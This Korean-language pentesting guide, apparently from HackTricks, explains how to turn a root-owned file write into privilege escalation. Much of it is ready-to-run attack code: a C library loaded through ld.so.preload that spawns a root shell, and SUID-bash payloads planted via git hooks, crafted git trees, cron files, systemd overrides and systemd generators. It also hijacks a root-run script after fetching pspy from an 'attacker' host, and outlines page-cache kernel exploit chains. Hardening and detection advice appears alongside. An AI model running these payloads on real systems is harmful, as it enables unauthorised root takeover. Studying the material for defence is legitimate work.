# Root 권한으로 임의 파일 쓰기

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

`/etc/ld.so.preload`는 동적 링커가 다른 공유 객체보다 먼저 로드하는 공유 객체의 시스템 전체 목록입니다. Secure-execution mode에서는 preloading에 추가 제한이 적용되므로 `/tmp/pe.so`와 같은 라이브러리 경로는 모든 SUID 바이너리에 적용되는 기법이 아닙니다.\
이 파일을 만들거나 수정할 수 있다면, 해당 파일을 로드하는 프로세스는 다른 공유 객체보다 먼저 목록에 있는 라이브러리를 로드하여 해당 프로세스의 컨텍스트에서 코드를 실행할 수 있습니다.<sup>[[12]](#references)</sup>

예: `echo "/tmp/pe.so" > /etc/ld.so.preload`

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unlink("/etc/ld.so.preload");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

### Git hooks

**Git hooks**는 commit 및 merge 작업을 포함해 repository에서 특정 이벤트가 발생할 때 실행되는 스크립트입니다. **특권을 가진 script나 사용자**가 해당 작업을 수행하고 공격자가 **`.git` 폴더에 쓸 수 있다면**, hook을 **privilege escalation**에 사용할 수 있습니다.<sup>[[13]](#references)</sup>

예를 들어, 새 commit이 생성될 때마다 실행되도록 git repo의 **`.git/hooks`**에 **스크립트를 생성**할 수 있습니다:

```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
chmod +x pre-commit
```

### 권한이 높은 Git 트리 내보내기 경로 탐색

권한이 높은 동기화 도구는 checkout을 하지 않고, 대신 `git ls-tree`로 공격자가 영향을 줄 수 있는 repository를 열거한 뒤 `git cat-file`로 각 blob을 읽고, 보고된 경로명을 staging 디렉터리에 결합해 직접 쓸 수 있습니다. `-c safe.directory=*`(소유자가 다른 repository에 대한 Git의 보호 기능을 비활성화)와 대상 경로가 staging 디렉터리 내부인지 확인하는 절차가 모두 없으면, 이는 **동기화 도구의 권한으로 임의 파일을 쓰는 취약점**이 됩니다. 절대 경로인 트리 항목 이름을 `os.path.join(stage, name)`에 전달하면 `stage`가 무시되고, `../`가 포함된 상대 경로는 파일 시스템에서 경로를 확인할 때 상위 디렉터리로 벗어납니다. 애플리케이션이 Git에 checkout을 맡기는 대신 원시 트리를 직접 파일로 만들기 때문에, checkout 시점의 경로명 거부 기능은 파일 쓰기를 막지 못합니다.<sup>[[30]](#references)[[32]](#references)[[33]](#references)</sup>

root 서비스, timer, deployment agent, template importer, backup/restore 작업에서 다음과 같은 코드 형태를 찾아보세요:<sup>[[30]](#references)</sup>

```python
entries = git("-c", "safe.directory=*", "ls-tree", "-rz", "HEAD")
for mode, oid, git_path in parse(entries):
    target = os.path.join(stage_root, git_path)  # no containment check
    os.makedirs(os.path.dirname(target), exist_ok=True)
    with open(target, "wb") as output:
        output.write(git("cat-file", "blob", oid))
```

Tree 항목은 `<mode> SP <name> NUL <raw object ID>` 형식으로 인코딩됩니다. `git hash-object --literally` 옵션은 일반적인 파싱이나 `git fsck`에서 거부될 수 있는 객체 데이터를 의도적으로 허용하므로, 임시 clone에서 파일명이 절대 경로인 tree를 만들 수 있습니다. 이 예제에서는 cron 파일 blob을 만들고, 조작한 tree를 commit으로 감싼 뒤 branch를 해당 commit으로 이동합니다. 하지만 악용하려면 권한이 있는 작업이 사용하는 repository를 업데이트할 수 있어야 하고, Git server가 잘못된 형식의 객체를 받아들여야 합니다.<sup>[[30]](#references)[[31]](#references)</sup>

```bash
blob=$(printf '%s\n' '* * * * * root cp /bin/bash /tmp/rootbash && chmod 6755 /tmp/rootbash' | git hash-object -w --stdin)
{ printf '100644 /etc/cron.d/git-sync\0'; printf '%s' "$blob" | xxd -r -p; } > tree.raw
tree=$(git hash-object -w -t tree --literally --stdin < tree.raw)
commit=$(printf 'crafted tree\n' | git commit-tree "$tree")
git update-ref refs/heads/main "$commit"
git ls-tree -r main
git push --force origin main
```

강화는 저장소 수집과 최종 파일 시스템 작업을 모두 다뤄야 합니다:<sup>[[30]](#references)[[33]](#references)[[34]](#references)</sup>

- `safe.directory=*`를 서비스가 신뢰해야 하는 정확한 저장소로 대체하고, 가능한 경우 root 권한 없이 저장소를 처리합니다.
- 파일을 생성하기 전에 절대 경로 이름과 `.` 또는 `..` 구성 요소를 거부합니다. 경로를 결합한 후 정규화하고 대상이 의도한 루트 아래에 있는지 확인합니다.
- 검사 후 파일을 여는 과정에서 발생하는 심볼릭 링크 경쟁 조건을 피합니다. 신뢰할 수 있는 디렉터리 파일 디스크립터를 기준으로 열고, Linux에서는 공격자가 제어하는 경로에 `RESOLVE_BENEATH`와 `RESOLVE_NO_SYMLINKS`를 지정한 `openat2()`를 사용합니다.
- plumbing 출력으로 checkout을 재구현하기보다 격리된 디렉터리에서 일반 checkout을 사용합니다. 원시 객체 수집이 필요하다면 `receive.fsckObjects=true` 같은 수신 측 검증을 활성화하고, 조작된 트리를 거부하는 데 필요한 경로 이름 관련 `receive.fsck.*` 검사를 완화하지 않습니다.

### 권한 상승 구성 배포

일부 관리 서비스는 의도한 시스템 상태를 구성 파일에 저장한 다음 높은 권한으로 배포합니다. 예를 들어, [openmediavault stores configuration in `/etc/openmediavault/config.xml`](https://docs.openmediavault.org/en/7.x/faq.html)하며, [RPC interface](https://docs.openmediavault.org/en/8.x/development/tools/omv_rpc.html)를 통해 서비스 변경 사항을 적용할 수 있습니다. 낮은 권한의 계정이 해당 파일을 쓰거나 교체할 수 있다면, 승인된 배포를 요청할 수도 있는지, 선택된 모듈이 변경된 필드를 root 권한으로 사용하는지도 검토합니다. SSH 계정 키, 예약 명령, 패키지 설치는 각각 요구 조건이 다릅니다. 파일이 존재하거나 XML 파일을 쓸 수 있다는 사실만으로는 어느 하나도 입증되지 않습니다. 파일과 상위 디렉터리의 권한, 호출자의 그룹 및 RPC 권한, 설치된 버전, 실제 소비자를 확인하되 열거 중에는 구성을 수정하거나 적용 작업을 실행하지 않습니다.

`/etc/fail2ban/action.d/` 아래의 Fail2Ban action 정의도 권한이 보호되어야 하는 구성 경계입니다. 해당 디렉터리를 쓰고 검색할 수 있는 사용자는 action 정의를 교체하거나 override를 추가할 수 있지만, 디렉터리 권한만으로 코드 실행이 입증되지는 않습니다. 활성화된 jail이 실제로 해당 action을 선택하는지, Fail2Ban 서비스가 더 높은 권한으로 이를 실행하는지, 승인된 reload/restart와 일치하는 ban 이벤트가 발생할지 확인합니다. Fail2Ban을 재시작할 수 있는 관련 없는 sudo 권한은 정확한 서비스 호출에 적용되고 변경된 정의가 로드될 때만 의미가 있습니다. [Fail2Ban's action configuration](https://github.com/fail2ban/fail2ban/blob/master/man/jail.conf.5)는 action 디렉터리와 jail의 관계를 설명하며, [sample action](https://github.com/fail2ban/fail2ban/blob/master/config/action.d/iptables.conf)은 `actionban`이 ban 발생 시 서비스 사용자의 권한으로 실행됨을 보여줍니다. 열거 중에는 action을 변경하거나 ban을 유발하지 말고 권한과 유효 구성을 확인합니다.

별도의 경계는 활성화된 Fail2Ban jail이 WHOIS 정보가 추가된 mail action을 사용할 때 생깁니다. [CVE-2021-32749](https://github.com/fail2ban/fail2ban/security/advisories/GHSA-m985-3f3v-cwmm)는 신뢰할 수 없는 WHOIS 텍스트가 GNU mailutils `mail`로 파이프되었고, 해당 프로그램의 escape 처리로 명령이 실행될 수 있었던 취약점입니다. 낮은 권한의 파일 작성자는 **선택된 WHOIS 클라이언트**의 서버 override 구성을 변경할 수 있다면 응답에 영향을 줄 수 있습니다. [Debian's `whois.conf(5)`](https://manpages.debian.org/bookworm/whois/whois.conf.5.en.html)는 해당 파일의 한 예를 설명하지만, 경로와 사용 방식은 설치 환경에 따라 다릅니다. 유효한 jail/action, 서비스 계정, 실제 WHOIS 클라이언트와 구성 경로, mail 구현, 응답 제어 가능성, 설치된 공급업체 수정 사항 또는 backport를 검토합니다. WHOIS 구성 파일에 쓸 수 있거나, 특정 Fail2Ban 버전이 설치되어 있거나, mail action이 존재한다는 사실만으로는 이 공격 경로가 입증되지 않습니다. 수동 열거 중에는 외부 서버에 질의하거나 ban을 유발하지 않습니다.

### TFTP 파일 생성 및 권한 있는 패키지 hook

접근 가능한 TFTP 서비스는 **유효한** tftpd-hpa 설정이 root로 실행되고, `--secure` 디렉터리로 파일 시스템 루트를 노출하며, `--create`를 활성화한 경우 컨테이너 또는 로컬 사용자 경계를 넘을 수 있습니다. [The tftpd-hpa manual](https://manpages.debian.org/trixie/tftpd-hpa/tftpd.8.en.html)은 파일 생성 및 사용자 옵션을 설명합니다. 이는 `/etc/apt/apt.conf.d/`를 포함한 권한이 있는 구성 디렉터리에 새 파일을 만드는 후보가 될 수 있지만, 기존 파일은 여전히 교체되지 않을 수 있습니다. [APT's configuration manual](https://manpages.debian.org/bookworm/apt/apt.conf.5.en.html)은 `APT::Update::Pre-Invoke` 명령을 설명합니다. root로 실행되는 `apt update`는 새 구성 파일을 읽는 경우에만 더 높은 권한의 소비자가 될 수 있습니다. 실행 중인 데몬의 실제 인수와 실행 계정, 네트워크 접근 가능성 및 필터링, 대상 디렉터리의 파일 생성 정책, APT의 유효 구성 범위, 이후의 권한 있는 실행을 확인합니다. 기본 파일, 쓰기 가능한 대상 디렉터리, 예약된 APT 명령 중 어느 하나만으로도 전체 경로가 입증되지는 않습니다. 수동 분류에서는 파일을 업로드하거나 APT를 실행하지 말고, 로컬 구성과 메타데이터 중 제한된 범위만 읽습니다.

### Cron 및 시간 파일

root가 실행하는 **cron 관련 파일을 쓸 수 있다면**, 다음 작업 실행 시 대개 코드를 실행할 수 있습니다. 주목할 대상은 다음과 같습니다:<sup>[[14]](#references)[[20]](#references)</sup>

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- `/var/spool/cron/` 또는 `/var/spool/cron/crontabs/`에 있는 root의 crontab
- `systemd` timer와 이들이 실행하는 서비스

빠른 점검:

```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```

일반적인 악용 경로:

- `/etc/crontab` 또는 `/etc/cron.d/`의 파일에 **새 root cron 작업 추가**
- `run-parts`가 이미 실행하는 **스크립트 교체**
- 실행되는 스크립트나 바이너리를 수정해 **기존 timer 대상에 backdoor 삽입**

최소 cron payload 예시:

```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```

`run-parts`에서 사용하는 cron 디렉터리에만 쓸 수 있다면, 그곳에 실행 파일을 넣으세요:

```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```

메모:

- `run-parts`는 보통 파일 이름에 점이 포함된 파일을 무시하므로, `backup.sh` 대신 `backup`처럼 이름을 지정하는 것이 좋습니다.<sup>[[15]](#references)</sup>
- 일부 시스템은 기존 cron 대신 `systemd` 타이머를 사용하지만, 악용 방식은 같습니다. **root가 나중에 실행할 항목을 수정하는 것**입니다.<sup>[[20]](#references)</sup>

### 서비스 및 소켓 파일

**`systemd` unit 파일**이나 해당 파일에서 참조하는 파일에 쓸 수 있다면, unit을 reload 및 restart하거나 서비스/소켓 활성화 경로가 트리거될 때까지 기다려 root 권한으로 코드를 실행할 수 있습니다.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)</sup>

ACL을 포함해 system unit 디렉터리 자체에 대한 쓰기 및 검색 권한도 확인하세요. 디렉터리 읽기/목록 조회가 거부되더라도 사용자가 `/etc/systemd/system`에 새 unit을 만들 수 있습니다. 하지만 해당 경로만으로는 아무것도 시작되지 않습니다. system manager가 새 unit을 로드하는지, 호출자에게 해당 이름으로 root 권한을 얻을 수 있는 `systemctl start` 또는 `restart` 권한(또는 다른 권한 상승 활성화 경로)이 실효적으로 있는지, 서비스가 의도한 사용자 ID로 실행되는지 확인하세요. 디스크에서 변경한 기존 로드 unit은 `daemon-reload`가 필요할 수 있으며, 새 이름의 unit은 로드 동작이 다릅니다. 와일드카드 restart 규칙만으로 충분하다고 판단하기 전에 정확한 sudo 인수와 제외 항목을 검토하세요. [systemd unit 검색 경로](https://www.freedesktop.org/software/systemd/man/latest/systemd.unit.html)와 [systemctl의 로드 및 reload 동작](https://www.freedesktop.org/software/systemd/man/latest/systemctl.html)을 참고하세요.

흥미로운 대상:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- `/etc/systemd/system/<unit>.d/*.conf`의 drop-in override
- `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`에서 참조하는 서비스 스크립트/바이너리
- root 서비스가 로드하는 쓰기 가능한 `EnvironmentFile=` 경로

빠른 확인:

```bash
ls -la /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
```

일반적인 악용 경로:

- 수정 가능한 root 소유 service unit에서 **`ExecStart=` 덮어쓰기**
- 악성 `ExecStart=`가 포함된 **drop-in override 추가** 및 기존 항목 먼저 초기화
- unit에서 이미 참조하는 script/binary에 **backdoor 삽입**
- 대응하는 `.service` 파일을 수정해 **socket-activated service 하이재킹**: socket이 연결을 받으면 시작되는 서비스

악성 override 예시:

```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```

일반적인 활성화 흐름:

```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```

서비스를 직접 재시작할 수 없더라도 socket-activated unit을 수정할 수 있다면, 클라이언트의 연결을 기다리는 것만으로 백도어가 설치된 서비스를 root 권한으로 실행할 수 있습니다.<sup>[[17]](#references)</sup>

### systemd generator 디렉터리

**System generators**는 unit 파일을 불러오기 전에 부팅 시와 설정을 다시 불러올 때 모두 system manager가 실행하는 실행 파일입니다. 따라서 system-generator 디렉터리(또는 기존 실행 파일 generator)에 대한 쓰기 권한은 root 코드 실행을 직접 가능하게 하는 수단이며, 감사 시 `*.service`와 `*.timer` 파일만 확인하면 놓치기 쉽습니다.<sup>[[35]](#references)[[36]](#references)</sup>

일반적인 검색 순서는 `/run/systemd/system-generators/`, `/etc/systemd/system-generators/`, `/usr/local/lib/systemd/system-generators/`, `/usr/lib/systemd/system-generators/`입니다(일부 배포판에서는 `/usr` 통합을 통해 `/lib/systemd/system-generators/`를 제공합니다). 앞선 디렉터리에 있는 같은 이름의 실행 파일이 뒤에 있는 실행 파일을 가립니다. 이러한 **입력 실행 파일 디렉터리**를 generator가 생성한 임시 unit 출력물이 들어 있는 `/run/systemd/generator`, `/run/systemd/generator.early`, `/run/systemd/generator.late`와 혼동하지 마세요.<sup>[[35]](#references)</sup>

빠른 확인:

```bash
for d in /run/systemd/system-generators /etc/systemd/system-generators \
         /usr/local/lib/systemd/system-generators /usr/lib/systemd/system-generators \
         /lib/systemd/system-generators; do
    [ -e "$d" ] || continue
    namei -l "$d"
    find "$d" -maxdepth 1 -writable -ls 2>/dev/null
    getfacl -p "$d" "$d"/* 2>/dev/null
done
```

새로 생성한 generator에는 실행 비트가 설정되어 있어야 합니다. write primitive가 바이트는 제어하지만 mode는 제어하지 못한다면, 이미 실행 가능한 generator를 대상으로 하세요. 해당 파일을 제자리에서 truncate하면 일반적으로 메타데이터가 보존됩니다. 디렉터리 자체에 쓰기 권한이 있다면 새 항목을 생성하고 실행 가능하도록 설정하세요.<sup>[[35]](#references)</sup>

```bash
cat > /etc/systemd/system-generators/zz-update <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown 0:0 /tmp/rootbash
chmod 4755 /tmp/rootbash
rm -f "$0"
EOF
chmod 755 /etc/systemd/system-generators/zz-update
```

`systemctl daemon-reload`을 **system** manager에서 실행하려면 적절한 권한이 필요하지만, 이 명령은 모든 system generator를 다시 실행합니다. 그렇지 않다면 권한이 있는 사용자가 reload를 실행하거나, 패키지 작업이 수행되거나, 시스템이 재부팅될 때까지 기다리세요. `~/.config/systemd/user-generators/`와 같은 user-generator 디렉터리는 user manager에서 실행되며, 그 자체로는 root 권한을 제공하지 않습니다.<sup>[[35]](#references)</sup>

보안 강화와 조사 시에는 최종 mode bits만 확인하지 말고 모든 경로 구성 요소와 ACL을 확인하고, generator의 기준 hash와 패키지 소유권을 기록하며, 모든 system-generator 입력 디렉터리에서 생성, 이름 변경, 콘텐츠 변경 또는 권한 변경을 감지하도록 알림을 설정하세요. 실행 후 one-shot generator가 스스로 삭제될 수 있으므로 쓰기 동작을 모니터링하는 것이 중요합니다. 생성된 `/run/systemd/generator*` 아래의 unit 트리는 다음 reload 시 다시 만들어집니다.<sup>[[35]](#references)[[36]](#references)</sup>

### 권한이 높은 PHP sandbox에서 사용하는 제한적인 `php.ini` 덮어쓰기

일부 custom daemon은 **제한된 `php.ini`**(예: `disable_functions=exec,system,...`)를 사용해 `php`를 실행하여 사용자가 제공한 PHP를 검증합니다. sandbox 내 코드가 여전히 `file_put_contents`와 같은 **쓰기 primitive**를 **하나라도** 사용할 수 있고 daemon이 사용하는 **정확한 `php.ini` 경로**에 접근할 수 있다면, 해당 **config를 덮어써서** 제한을 해제한 다음, 권한이 상승된 상태로 실행되는 두 번째 payload를 제출할 수 있습니다.<sup>[[2]](#references)</sup>

일반적인 흐름:

1. 첫 번째 payload가 sandbox config를 덮어씁니다.
2. 위험한 함수가 다시 활성화된 상태에서 두 번째 payload가 코드를 실행합니다.

최소 예시(daemon이 사용하는 경로로 바꾸세요):

```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```

daemon이 root로 실행되거나 root 소유 경로를 사용해 검증하는 경우, 두 번째 실행은 root 컨텍스트를 얻게 됩니다. 이는 sandboxed runtime이 여전히 파일을 쓸 수 있을 때 발생하는 **config overwrite를 통한 privilege escalation**입니다.

### binfmt_misc

`binfmt_misc`는 `/proc/sys/fs/binfmt_misc` 아래에 등록 정보를 노출합니다. 각 등록 정보는 파일 형식 패턴을 인터프리터와 연결합니다. 권한에 미치는 영향은 누가 등록 정보를 변경할 수 있는지, 그리고 이후 어떤 프로세스가 일치하는 파일을 실행하는지에 따라 달라지므로, 이를 privilege escalation 경로로 간주하기 전에 해당 조건을 확인하세요.<sup>[[21]](#references)</sup>

`CAP_DAC_OVERRIDE`가 있는 실행 가능한 helper가 호출자가 제어하는 데이터를 받아 `/proc/sys/fs/binfmt_misc/register`에 기록한다면, 호출자가 해당 노드에 직접 쓸 수 없어도 별도의 등록 경로가 될 수 있습니다. 열거 중에는 helper를 실행하지 말고 입력 및 쓰기 동작을 검토하세요. 등록된 규칙에서 `C` 플래그를 사용하면 인터프리터는 일치하는 바이너리에 기반한 자격 증명을 받습니다. 따라서 root 소유 SUID 대상 파일이 일치하면 호출자가 제어하는 인터프리터가 root로 실행될 수 있습니다. `binfmt_misc` 마운트 및 등록 정책, helper의 유효 capability, 정확한 규칙과 인터프리터 경로, 실행 가능한 SUID 대상 파일, 그리고 `no_new_privs` 또는 `nosuid` 마운트가 SUID 전환을 막는지 확인하세요. capability 비트나 내장된 경로 문자열만으로는 검토 단서일 뿐입니다.<sup>[[21]](#references)</sup> SUID 억제 조건은 [execve(2)](https://man7.org/linux/man-pages/man2/execve.2.html)를 참조하세요.

### 스키마 핸들러 덮어쓰기 (예: http: 또는 https:)

데스크톱 환경은 URI 스킴에 사용할 애플리케이션을 선택할 때 MIME 연결 및 desktop entry를 사용합니다. 공격자가 관련 사용자별 설정 및 desktop-entry 디렉터리에 쓸 수 있다면, 해당 스킴을 자신이 제어하는 launcher로 리디렉션할 수 있습니다. `$HOME/.config/mimeapps.list` 파일을 수정해 HTTP 및 HTTPS URL 핸들러가 악성 파일을 가리키도록 설정하면(예: `x-scheme-handler/http=evil.desktop` 및 `x-scheme-handler/https=evil.desktop`), 사용자가 클릭할 때 해당 desktop entry가 실행될 수 있습니다.<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>

```bash
[Desktop Entry]
Type=Application
Name=Evil Desktop Entry
Exec=/bin/sh -c "id > /tmp/mime-handler-pwned"
MimeType=x-scheme-handler/http;x-scheme-handler/https;
```

### Root가 사용자 쓰기 권한이 있는 스크립트/바이너리를 실행하는 경우

권한이 높은 workflow가 `/bin/sh /home/username/.../script` 같은 명령(또는 권한이 없는 사용자가 소유한 디렉터리 내부의 바이너리)을 실행한다면, 이를 하이재킹할 수 있습니다:<sup>[[1]](#references)</sup>

- **실행 감지:** pspy로 프로세스를 모니터링해 root가 사용자 제어 경로를 호출하는지 확인합니다.<sup>[[25]](#references)</sup>

```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```

- **쓰기 가능 여부 확인:** 대상 파일과 해당 디렉터리의 소유자가 본인인지, 본인이 쓸 수 있는지 확인합니다.
- **대상 하이재킹:** 원본 바이너리/스크립트를 백업하고 SUID shell을 생성하는 payload(또는 다른 root 작업을 수행하는 payload)를 배치한 다음 권한을 복원합니다:

```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```

- **권한이 있는 작업을 트리거합니다** (예: helper를 생성하는 UI 버튼 누르기). root가 하이재킹된 경로를 다시 실행하면 `./rootshell -p`로 권한이 상승된 shell을 가져옵니다.

### 권한이 있는 바이너리를 page-cache에서만 수정하기

일부 kernel 버그는 파일을 **디스크에서** 수정하지 않습니다. 대신 읽을 수 있는 파일의 **page cache 사본**만 수정할 수 있게 합니다. **setuid**이거나 그 밖의 방식으로 root가 실행하는 바이너리를 대상으로 삼을 수 있다면, 다음 실행 시 디스크에 있는 파일 hash는 바뀌지 않은 채 메모리의 공격자 제어 바이트가 실행되어 권한이 상승할 수 있습니다.<sup>[[3]](#references)[[4]](#references)</sup>

이를 **런타임 전용 파일 쓰기 primitive**로 생각하면 유용합니다.<sup>[[3]](#references)</sup>

- **디스크는 그대로 유지**: inode와 디스크상의 바이트는 바뀌지 않습니다
- **메모리는 수정됨**: 캐시된 페이지를 읽거나 실행하는 프로세스는 공격자가 수정한 콘텐츠를 가져옵니다
- **효과는 일시적**: 재부팅하거나 cache eviction이 발생하면 변경 사항이 사라집니다

이 primitive는 고전적인 **임의 파일 쓰기**와 Dirty COW / Dirty Pipe 같은 이전 **page-cache 악용** 버그의 중간에 있습니다.<sup>[[3]](#references)</sup>

- Dirty COW는 race에 의존했습니다
- Dirty Pipe에는 write-position 제약이 있었습니다
- 취약한 경로를 통해 file-backed 페이지에 직접 쓸 수 있다면, page-cache 전용 primitive가 더 안정적일 수 있습니다

#### 일반적인 privesc 흐름

1. **file-backed page cache 페이지**에 쓸 수 있는 kernel primitive를 확보합니다
2. 이를 **읽을 수 있는 권한 있는 바이너리** 또는 root가 실행하는 다른 파일에 사용합니다
3. 페이지가 cache에서 제거되기 전에 실행을 트리거합니다
4. 디스크상의 파일은 수정되지 않은 것처럼 보이는 상태로 root 권한의 code execution을 얻습니다

일반적으로 가치가 높은 대상:

- **setuid-root** 바이너리
- **root 서비스**가 실행하는 helper
- **host kernel/page cache를 공유하는 container**에서 흔히 실행되는 바이너리

#### AF_ALG + `splice()` 예시 경로

Copy Fail (CVE-2026-31431)은 이 유형의 좋은 사례입니다. 취약한 경로는 Linux crypto userspace API (`AF_ALG` / `algif_aead`)에 있었습니다.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- `splice()`는 읽을 수 있는 파일의 page-cache 페이지 참조를 crypto TX scatterlist로 옮길 수 있습니다
- 제자리에서 실행되는 `algif_aead` 복호화 경로는 source와 destination buffer를 재사용했습니다
- 이후 `authencesn`이 destination tag 영역에 썼습니다
- 해당 영역이 여전히 splice된 file-backed 페이지를 참조하고 있으면, 쓰기는 **대상 파일의 page cache**에 반영됩니다

따라서 주목할 기법은 CVE 자체가 아니라 다음과 같은 패턴입니다.

- **file-backed cache 페이지를 kernel subsystem에 전달**
- 해당 subsystem이 이를 **쓰기 가능한 출력으로 취급**하게 만듦
- 메모리에서 제어 가능한 소규모 덮어쓰기를 트리거

공개된 PoC는 메모리에서 `/usr/bin/su`를 패치하기 위해 반복해서 **4바이트 쓰기**를 수행한 뒤 실행했습니다.<sup>[[4]](#references)[[7]](#references)</sup>

#### ESP / XFRM + netfilter TEE clone 예시 경로

DirtyClone (CVE-2026-43503)은 같은 **page-cache 전용 write-to-root** 패턴의 또 다른 변형을 보여 줍니다. 이번에는 sink가 `AF_ALG`가 아니라 **IPsec ESP 복호화**입니다.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

중요한 기법은 **metadata-laundering 단계**입니다.

- `splice()`가 **읽기 전용 file-backed page-cache 페이지**를 ESP-in-UDP 패킷에 넣습니다
- 기존 DirtyFrag 완화책은 `SKBFL_SHARED_FRAG`로 skb를 표시해 `esp_input()`이 **복호화 전에 복사**하도록 했습니다
- netfilter `TEE`는 `nf_dup_ipv4()` -> `__pskb_copy_fclone()`을 통해 패킷을 복제합니다
- clone은 **동일한 물리 page-cache 참조**를 유지하지만 `SKBFL_SHARED_FRAG`는 잃습니다
- 그러면 `esp_input()`은 clone을 안전한 것으로 간주하고 file-backed 페이지에서 **제자리 `cbc(aes)` 복호화**를 수행합니다

따라서 보안 검토자가 얻을 교훈은 CVE보다 더 광범위합니다. 어떤 완화책이 작업 전에 복사가 필요한지 판단하기 위해 **skb/page metadata**에 의존한다면, backing page는 유지하면서 metadata를 제거하는 모든 **clone/copy 경로**가 쓰기 primitive를 조용히 다시 열 수 있습니다.

일반적인 악용 흐름:

1. `unshare(CLONE_NEWUSER | CLONE_NEWNET)`을 호출해 **private network namespace 내에서 `CAP_NET_ADMIN`을 확보**
2. loopback을 활성화하고 `mangle/OUTPUT`에 **netfilter `TEE` 규칙**을 설치
3. `NETLINK_XFRM`을 통해 **XFRM ESP transport SA**를 설치
4. 대상 4바이트 word를 각각 SA `seq_hi` 필드에 인코딩합니다 (DirtyFrag의 word-selection 기법)
5. splice된 ESP-in-UDP 패킷을 전송해 **TEE clone**이 `esp_input()`에 도달하고 **제자리에서** 복호화하도록 합니다
6. `/usr/bin/su` 또는 다른 권한 있는 실행 파일의 page-cache 사본에 공격자가 제어하는 code가 들어갈 때까지 반복합니다

운영상의 영향은 `AF_ALG` 예시와 같습니다. 디스크의 파일은 그대로 유지되지만 `execve()`가 **변조된 page-cache 바이트**를 사용해 root 권한을 제공합니다.<sup>[[8]](#references)[[9]](#references)</sup>

이 변형에서 유용한 노출 확인 항목:

```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```

단기적인 attack surface 축소도 여기서는 경로별로 달라집니다. `48f6a5356a33`이 포함된 kernel로 업그레이드하면 clone path가 수정되고, `xt_TEE` autoload를 차단하면 **flag-laundering 단계**가 제거되며, `esp4` / `esp6`를 차단하면 **decrypt sink**가 제거됩니다.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

#### 노출 여부 확인 및 탐지

이런 종류의 bug가 의심되더라도 디스크 무결성 검사에만 의존하지 마세요. 다음 항목도 확인하세요:

```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```

아래 설정 값은 loadable interface와 커널에 내장된 interface를 구분합니다. crypto 빌드 규칙은 `CONFIG_CRYPTO_USER_API_AEAD`를 `algif_aead`에 매핑합니다.<sup>[[26]](#references)[[27]](#references)</sup>

- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead`를 모듈로 load/unload할 수 있습니다
- `CONFIG_CRYPTO_USER_API_AEAD=y`: interface가 커널에 내장됩니다
- setuid 바이너리는 좋은 대상으로, page-cache만 패치해도 로컬 foothold를 root 권한으로 높일 수 있습니다

#### `algif_aead` 경로의 attack-surface 축소

취약한 interface가 loadable module로 제공되는 경우:<sup>[[6]](#references)[[28]](#references)[[29]](#references)</sup>

```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```

커널에 컴파일된 경우, 일부 공개 사례에서는 다음과 같이 init 경로를 차단한다고 보고했습니다:<sup>[[28]](#references)</sup>

```bash
initcall_blacklist=algif_aead_init
```

